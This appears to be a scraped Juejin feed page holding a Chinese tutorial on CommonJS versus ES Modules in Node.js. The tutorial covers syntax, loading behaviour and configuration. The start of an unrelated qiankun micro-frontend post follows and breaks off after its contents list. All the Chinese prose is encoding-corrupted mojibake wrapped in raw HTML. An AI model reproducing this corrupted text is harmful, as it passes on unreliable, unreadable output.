            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2799775299157614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜çˆ±é’“é±¼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T06:09:35.000Z" title="Mon Dec 08 2025 06:09:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>åœ¨æ„å»º Node.js é¡¹ç›®æ—¶ï¼Œâ€œæ¨¡å—åŒ–â€æ˜¯å¼€å‘è€…å¿…é¡»æŒæ¡çš„åŸºç¡€èƒ½åŠ›ã€‚éšç€ç”Ÿæ€çš„å‘å±•ï¼ŒNode.js åŒæ—¶æ”¯æŒä¸¤å¥—æ¨¡å—ä½“ç³»ï¼š<strong>CommonJSï¼ˆCJSï¼‰</strong> ä¸ <strong>ES6 Moduleï¼ˆESMï¼‰</strong>ã€‚å®ƒä»¬çš„å‡ºç°èƒŒæ™¯ä¸åŒï¼Œè¯­æ³•ä¹Ÿä¸åŒï¼Œç”šè‡³åœ¨è¡Œä¸ºä¸Šå­˜åœ¨æ˜¾è‘—å·®å¼‚ã€‚å¯¹æ¨¡å—ç³»ç»Ÿç†è§£å¾—è¶Šæ·±ï¼Œæ„å»ºå¤§å‹é¡¹ç›®æ—¶å°±è¶Šå¾—å¿ƒåº”æ‰‹ã€‚</p>
</blockquote>
<p>æœ¬æ–‡å°†ä»æ¨¡å—æ¦‚å¿µã€ä½¿ç”¨æ–¹å¼ã€å·®å¼‚ç‚¹åˆ°å®é™…é¡¹ç›®ä¸­çš„é€‰æ‹©ç­–ç•¥ï¼Œå¸®åŠ©ä½ ç³»ç»ŸæŒæ¡ Node.js ä¸­ä¸¤ç§æ¨¡å—ä½“ç³»çš„æ ¸å¿ƒé€»è¾‘ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€æ¨¡å—åŒ–çš„æ„ä¹‰</h2>
<p>åœ¨æ²¡æœ‰æ¨¡å—æœºåˆ¶å‰ï¼Œä»£ç éœ€è¦é€šè¿‡ script æ ‡ç­¾æˆ–å…¨å±€å˜é‡å…±äº«ï¼Œå®¹æ˜“å‘ç”Ÿå‘½åæ±¡æŸ“ã€æ–‡ä»¶è€¦åˆå’Œç»´æŠ¤å›°éš¾ã€‚æ¨¡å—åŒ–è§£å†³äº†è¿™äº›ç—›ç‚¹ï¼Œå¸¦æ¥äº†ï¼š</p>
<ul>
<li>æ¸…æ™°çš„é¡¹ç›®ç»“æ„</li>
<li>ä»£ç éš”ç¦»ä¸ä½œç”¨åŸŸå®‰å…¨</li>
<li>å¯å¤ç”¨ä¸å¯ç»´æŠ¤çš„ä»£ç ç»„ç»‡æ–¹å¼</li>
<li>æ›´æ˜“æ‰©å±•çš„å¤§å‹å·¥ç¨‹èƒ½åŠ›</li>
</ul>
<p>Node.js å¤©ç”Ÿä»¥æ¨¡å—ä¸ºå•ä½ç»„ç»‡ä»£ç ï¼Œå› æ­¤æŒæ¡æ¨¡å—ç³»ç»Ÿæ˜¯å­¦ä¹  Node.js çš„å¿…å¤‡åŸºç¡€ã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€CommonJSï¼šNode.js é»˜è®¤æ¨¡å—ç³»ç»Ÿ</h2>
<p>CommonJS æ˜¯ Node.js è¯ç”Ÿä¹‹åˆé‡‡ç”¨çš„æ¨¡å—æœºåˆ¶ï¼Œä¸»è¦ç‰¹ç‚¹æ˜¯ï¼š</p>
<ul>
<li>åŒæ­¥åŠ è½½</li>
<li>è¿è¡Œæ—¶æ‰§è¡Œ</li>
<li>ä½¿ç”¨ <code>require</code> å¯¼å…¥</li>
<li>ä½¿ç”¨ <code>module.exports</code> å¯¼å‡º</li>
</ul>
<p>Node.js çš„æ ¸å¿ƒæ¨¡å—ï¼ˆfsã€path ç­‰ï¼‰éƒ½åŸºäº CommonJS æ„å»ºã€‚</p>
<h3 data-id="heading-2">1. CommonJS å¯¼å…¥</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);
</code></pre>
<h3 data-id="heading-3">2. CommonJS å¯¼å‡º</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-title function_">sum</span>(<span class="hljs-params">a, b</span>) {
    <span class="hljs-keyword">return</span> a + b;
  }
};
</code></pre>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨ç®€å†™ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-built_in">exports</span>.<span class="hljs-property">test</span> = <span class="hljs-function">() =&gt;</span> {};
</code></pre>
<p>CommonJS æ˜¯â€œæ‰§è¡Œæ—¶åŠ è½½â€ï¼Œæ¨¡å—åœ¨ç¬¬ä¸€æ¬¡è¢« <code>require</code> æ—¶æ‰§è¡Œå¹¶ç¼“å­˜ã€‚</p>
<hr/>
<h2 data-id="heading-4">ä¸‰ã€ES6 æ¨¡å—ï¼šç°ä»£ JavaScript æ¨¡å—ä½“ç³»</h2>
<p>ES6 Module æ˜¯ ECMAScript å®˜æ–¹æ¨å‡ºçš„æ¨¡å—æ ‡å‡†ï¼Œæ—¨åœ¨ç»Ÿä¸€å‰åç«¯ JavaScript çš„æ¨¡å—åŒ–è§„èŒƒã€‚</p>
<p>ç‰¹ç‚¹åŒ…æ‹¬ï¼š</p>
<ul>
<li>é™æ€è§£æï¼ˆç¼–è¯‘æ—¶ç¡®å®šå¯¼å…¥å¯¼å‡ºï¼‰</li>
<li>æ”¯æŒ tree-shaking</li>
<li>è¯­æ³•æ›´ç®€æ´</li>
<li>å¼‚æ­¥åŠ è½½èƒ½åŠ›æ›´å¥½</li>
</ul>
<h3 data-id="heading-5">1. ES6 å¯¼å…¥</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> fs <span class="hljs-keyword">from</span> <span class="hljs-string">"fs"</span>;
</code></pre>
<h3 data-id="heading-6">2. ES6 å¯¼å‡º</h3>
<p>é»˜è®¤å¯¼å‡ºï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {}
</code></pre>
<p>å‘½åå¯¼å‡ºï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">sum</span>(<span class="hljs-params">a, b</span>) {}
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PI</span> = <span class="hljs-number">3.14</span>;
</code></pre>
<p>ESM å…·æœ‰å¯åœ¨ç¼–è¯‘é˜¶æ®µåˆ†æä¾èµ–çš„ä¼˜åŠ¿ï¼Œä½¿å…¶æ›´ç¬¦åˆç°ä»£å·¥ç¨‹åŒ–è¶‹åŠ¿ã€‚</p>
<hr/>
<h2 data-id="heading-7">å››ã€CJS ä¸ ESM ä¹‹é—´çš„å·®å¼‚</h2>
<p>è™½ç„¶ä¸¤è€…éƒ½èƒ½å®ç°æ¨¡å—åŒ–ï¼Œä½†å®ƒä»¬åœ¨æœºåˆ¶å’Œè¡Œä¸ºä¸Šæœ‰æ˜æ˜¾ä¸åŒã€‚</p>
<h3 data-id="heading-8">1. åŠ è½½æ–¹å¼ä¸åŒ</h3>
<ul>
<li>CommonJSï¼šåŒæ­¥åŠ è½½</li>
<li>ES Moduleï¼šå¼‚æ­¥ä¸”é™æ€è§£æ</li>
</ul>
<p>å› æ­¤ ESM æ›´é€‚åˆæµè§ˆå™¨å’Œæœªæ¥çš„ Node.js ä¼˜åŒ–åœºæ™¯ã€‚</p>
<hr/>
<h3 data-id="heading-9">2. è¯­æ³•å·®å¼‚</h3>

























<table><thead><tr><th>åŠŸèƒ½</th><th>CommonJS</th><th>ES6 Module</th></tr></thead><tbody><tr><td>å¯¼å…¥</td><td><code>require()</code></td><td><code>import</code></td></tr><tr><td>å¯¼å‡º</td><td><code>module.exports</code></td><td><code>export</code></td></tr><tr><td>é»˜è®¤å¯¼å‡º</td><td><code>module.exports = obj</code></td><td><code>export default obj</code></td></tr></tbody></table>
<hr/>
<h3 data-id="heading-10">3. å¯¼å…¥è·¯å¾„é™åˆ¶ä¸åŒ</h3>
<p>CommonJS å¯ä»¥çœç•¥æ–‡ä»¶åç¼€ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-built_in">require</span>(<span class="hljs-string">"./util"</span>);
</code></pre>
<p>ESM å¿…é¡»å†™å®Œæ•´åç¼€ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-string">"./util.js"</span>;
</code></pre>
<hr/>
<h3 data-id="heading-11">4. this æŒ‡å‘ä¸åŒ</h3>
<ul>
<li>CommonJS ä¸­çš„ <code>this</code> æŒ‡å‘ <code>module.exports</code></li>
<li>ES Module ä¸­çš„ <code>this</code> æ˜¯ <code>undefined</code></li>
</ul>
<p>åæ˜ äº†ä¸¤è€…çš„è®¾è®¡ç†å¿µå·®å¼‚ã€‚</p>
<hr/>
<h3 data-id="heading-12">5. é¡¶å±‚ await æ”¯æŒ</h3>
<p>ESM æ”¯æŒåœ¨æ¨¡å—é¡¶å±‚ä½¿ç”¨ <code>await</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchData</span>();
</code></pre>
<p>è€Œ CommonJS ä¸æ”¯æŒï¼Œåªèƒ½é€šè¿‡ async åŒ…è£¹ã€‚</p>
<hr/>
<h2 data-id="heading-13">äº”ã€åœ¨ Node.js ä¸­å¦‚ä½•é€‰æ‹©æ¨¡å—ä½“ç³»ï¼Ÿ</h2>
<p>ç›®å‰ Node.js åŒæ—¶æ”¯æŒ CJS ä¸ ESMï¼Œä¸¤è€…å„æœ‰é€‚ç”¨åœºæ™¯ã€‚</p>
<h3 data-id="heading-14">1. é€‰æ‹© CommonJS çš„åœºæ™¯</h3>
<ul>
<li>æ—§é¡¹ç›®æˆ–éœ€è¦å…¼å®¹æ—©æœŸ Node.js</li>
<li>ä½¿ç”¨å¤§é‡å†å²åº“ï¼ŒCJS ç”Ÿæ€æ›´å®Œæ•´</li>
<li>å·¥å…·ç±»ã€è„šæœ¬ç±»ç¨‹åºï¼Œå¯åŠ¨é€Ÿåº¦è¦æ±‚é«˜</li>
</ul>
<p>CommonJS æ›´ç¨³å®šï¼Œä¹Ÿæ›´ç¬¦åˆ Node.js çš„ä¼ ç»Ÿå¼€å‘æ¨¡å¼ã€‚</p>
<hr/>
<h3 data-id="heading-15">2. é€‰æ‹© ES6 Module çš„åœºæ™¯</h3>
<ul>
<li>æ–°é¡¹ç›®å€¾å‘ç°ä»£è§„èŒƒ</li>
<li>æ›´å¥½é…åˆ bundlerï¼ˆå¦‚ Webpackã€Viteï¼‰</li>
<li>éœ€è¦é¡¶å±‚ await</li>
<li>é¡¹ç›®éœ€è¦å‹ç¼© tree-shaking</li>
</ul>
<p>ç°ä»£é¡¹ç›®é€æ¸è½¬å‘ ESMï¼Œä¹Ÿç¬¦åˆå‰åç«¯ç»Ÿä¸€çš„è¶‹åŠ¿ã€‚</p>
<hr/>
<h2 data-id="heading-16">å…­ã€å¦‚ä½•é…ç½® Node.js ä»¥ä½¿ç”¨ ES Moduleï¼Ÿ</h2>
<p>Node.js é»˜è®¤ä½¿ç”¨ CommonJSï¼Œå¦‚æœéœ€è¦å¯ç”¨ ES Moduleï¼Œå¯ä»¥é‡‡ç”¨ä¸¤ç§æ–¹å¼ï¼š</p>
<h3 data-id="heading-17">æ–¹å¼ 1ï¼šå°† package.json é…ç½®ä¸º ES Module</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"module"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-18">æ–¹å¼ 2ï¼šä½¿ç”¨ <code>.mjs</code> æ‰©å±•å</h3>
<pre><code class="hljs">app.mjs
utils.mjs
</code></pre>
<p>ä¸¤è€…éƒ½å¯ä»¥ï¼Œè®© Node.js æŒ‰ ESM è§„èŒƒè§£ææ–‡ä»¶ã€‚</p>
<hr/>
<h2 data-id="heading-19">ä¸ƒã€åœ¨åŒä¸€é¡¹ç›®ä¸­æ··ç”¨ CJS å’Œ ESM</h2>
<p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä½ å¯èƒ½éœ€è¦æ··ç”¨æ¨¡å—ã€‚</p>
<h3 data-id="heading-20">ä» CJS å¯¼å…¥ ESM</h3>
<p>éœ€è¦å¼‚æ­¥åŠ¨æ€å¯¼å…¥ï¼š</p>
<pre><code class="hljs language-js" lang="js">(<span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">"./esm-module.js"</span>);
})();
</code></pre>
<h3 data-id="heading-21">ä» ESM å¯¼å…¥ CJS</h3>
<p>æ”¯æŒé»˜è®¤å¯¼å…¥ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> pkg <span class="hljs-keyword">from</span> <span class="hljs-string">"./cjs-module.cjs"</span>;
</code></pre>
<p>æ··ç”¨ä¸æ¨èä½œä¸ºé•¿æœŸæ–¹æ¡ˆï¼Œä½†åœ¨è¿ç§»é˜¶æ®µéå¸¸å¸¸è§ã€‚</p>
<hr/>
<h2 data-id="heading-22">å…«ã€æ€»ç»“</h2>
<p>CommonJS å’Œ ES6 Module ä»£è¡¨äº† Node.js çš„è¿‡å»ä¸æœªæ¥ï¼š</p>
<ul>
<li>CommonJS ç¨³å®šã€æˆç†Ÿï¼Œæ˜¯ Node.js çš„ä¼ ç»ŸåŸºç¡€ã€‚</li>
<li>ES6 Module ç°ä»£ã€å¯ä¼˜åŒ–ï¼Œæ˜¯æœªæ¥è¶‹åŠ¿ã€‚</li>
</ul>
<p>ä¸¤è€…åœ¨åŠ è½½æ–¹å¼ã€è¯­æ³•ã€ä¾èµ–è§£æã€å·¥å…·é“¾æ”¯æŒç­‰æ–¹é¢éƒ½æœ‰ä¸åŒã€‚ç†è§£ä¸¤è€…çš„è®¾è®¡é€»è¾‘ï¼Œæ‰èƒ½åœ¨é¡¹ç›®ä¸­åšå‡ºæ­£ç¡®é€‰æ‹©ã€‚</p>
<p>åœ¨å®é™…å¼€å‘ä¸­ï¼š</p>
<ul>
<li><strong>æ–°é¡¹ç›®ä¼˜å…ˆ ESM</strong></li>
<li><strong>æ—§é¡¹ç›®ç»§ç»­ä½¿ç”¨ CJS æ›´ç¨³</strong></li>
<li><strong>æ··ç”¨æ—¶æ³¨æ„å¼‚æ­¥ import ä¸å¯¼å…¥è·¯å¾„è§„åˆ™</strong></li>
</ul>
<p>æŒæ¡æ¨¡å—ç³»ç»Ÿï¼Œæ˜¯æ·±å…¥ Node.js çš„é‡è¦ä¸€æ­¥ã€‚</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å…¨ç½‘æœ€å…¨çš„ qiankun åŸºäº react18+ï¼ˆä¸»åº”ç”¨ï¼‰ã€vue3.4+ï¼ˆå¾®åº”ç”¨ï¼‰å®ç°é¡µç­¾ç¼“å­˜ï¼Œé¡µé¢ç¼“å­˜]]></title>    <link>https://juejin.cn/post/7580683234437152831</link>    <guid>https://juejin.cn/post/7580683234437152831</guid>    <pubDate>2025-12-08T06:07:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580683234437152831" data-draft-id="7580740782933442602" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å…¨ç½‘æœ€å…¨çš„ qiankun åŸºäº react18+ï¼ˆä¸»åº”ç”¨ï¼‰ã€vue3.4+ï¼ˆå¾®åº”ç”¨ï¼‰å®ç°é¡µç­¾ç¼“å­˜ï¼Œé¡µé¢ç¼“å­˜"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2025-12-08T06:07:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å››çœ¼è‚¥é±¼"/> <meta itemprop="url" content="https://juejin.cn/user/2995504913591661"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å…¨ç½‘æœ€å…¨çš„ qiankun åŸºäº react18+ï¼ˆä¸»åº”ç”¨ï¼‰ã€vue3.4+ï¼ˆå¾®åº”ç”¨ï¼‰å®ç°é¡µç­¾ç¼“å­˜ï¼Œé¡µé¢ç¼“å­˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2995504913591661/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å››çœ¼è‚¥é±¼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T06:07:01.000Z" title="Mon Dec 08 2025 06:07:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    40
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Qiankun å¾®å‰ç«¯é…ç½®ä¸é¡µç­¾ç¼“å­˜å®ç°æ–¹æ¡ˆ</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7298446b216143618e28af6ceb3b6b7e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zub55y86IKl6bG8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779420&amp;x-signature=kz3%2B3I9X5fCIwDXoHeK5RynAkjk%3D" alt="qiankun-blue.jpg" loading="lazy"/></p>
<blockquote>
<p>éœ€è¦æºç å¯ä»¥ç§ä¿¡æˆ‘</p>
</blockquote>
<h3 data-id="heading-1">ğŸ“‹ ç›®å½•</h3>
<ul>
<li><a href="#%E9%A1%B9%E7%9B%AE%E6%A6%82%E8%BF%B0" title="#%E9%A1%B9%E7%9B%AE%E6%A6%82%E8%BF%B0">é¡¹ç›®æ¦‚è¿°</a></li>
